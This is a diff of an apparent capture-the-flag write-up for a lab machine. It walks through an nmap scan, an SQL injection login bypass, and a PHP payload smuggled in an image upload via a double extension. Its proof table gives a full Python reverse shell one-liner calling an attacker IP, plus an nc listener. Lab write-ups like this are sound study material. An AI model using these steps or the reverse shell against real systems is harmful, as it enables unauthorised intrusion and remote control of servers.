@@ -19,6 +19,7 @@ _Fig: 1 | Nmap scan foud open port._
 ![](images/2scan.PNG)
 _Fig: 2 | Nmap scan foud open port._
 
+
 Two ports identified after the Nmap scan,
 
 - **22/tcp – Open SSH**
@@ -26,6 +27,8 @@ Two ports identified after the Nmap scan,
 - **80/tcp – Open HTTP**
 
 **Command used in Nmap Scan** - nmap -sC -sV -V 10.10.10.185
+
+##
 
 # Exploitation
 
@@ -35,50 +38,68 @@ After the Nmap Scan tried to find a vulnerability inside the server. Using open 
 
 _Fig: 3 | Home page of the server._
 
+
 There is a login. Tried to bypass the login and can successfully bypass the login using SQL Injection to the password filed. In this password field vulnerable to SQL Injection.
+
 
 ![](https://user-images.githubusercontent.com/31987272/81840701-fd792800-9566-11ea-91d6-301f384ad4bc.PNG)
 
 _Fig: 4 | SQL Injection to Password Field._
 
+
 It&#39;s directed to the image uploading page. In this they allowed only jpg, jpeg, png image file formats.
+
 
 ![](https://user-images.githubusercontent.com/31987272/81840857-2d283000-9567-11ea-9e82-d06409637365.PNG)
 
 _Fig: 5 | image uploading field._
 
+
 ![](https://user-images.githubusercontent.com/31987272/81841066-7b3d3380-9567-11ea-9e35-5038f8f41384.PNG)
 
 _Fig: 6 | Allowed image formats._
 
+
 Then using this upload an image step try do an exploit so that inserting a payload to the image. Using exiftool.
 
+
 ![](https://user-images.githubusercontent.com/31987272/81841075-7f695100-9567-11ea-8f95-c11e44ac6af6.PNG)
+
 _Fig: 7 | Payload with image._
 
+
 Then this need to run using PHP so that change the file format as _ **php.jpg** __._ This only check the last format because of the weakness of the verification so easily can upload the image.
+
 
 ![](images/8.PNG)
 
 _Fig: 8 | Change the image format._
 
+
 The check the location of the image which posted already in the server. Copy the location and rename the image name as _ **kalpani.php.jpg** __._ Then input the **cmd=ls** command to check whether is it working or not.
+
 
 ![](images/9.PNG)
 
 _Fig: 9 | rename the file name in the location and command input._
 
+
 It works. So now can execute the command in here and also can view the files in web directory.
+
 
 ![](images/10.PNG)
 
 _Fig: 10 | view web directory files._
 
+
 After that take the revers shell python script from pentestmonkey cheat sheet and change the python version to python3 and include the python script to location and run. After this can take the web shell.
+
 
 ![](images/11.PNG)
 
 _Fig: 11 | Include the python script._
+
+##
 
 # Proof
 
@@ -105,6 +126,9 @@ _Fig: 12 | Web Shell._
 | reverse shell script to image location | http://10.10.10.185/images/uploads/test.php.jpg?cmd=python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((&quot;10.10.14.168&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; |
 | listling check | nc -nlvp 1234 |
 | directory list | ls |
+
+##
+
 
 # Conclusion
 
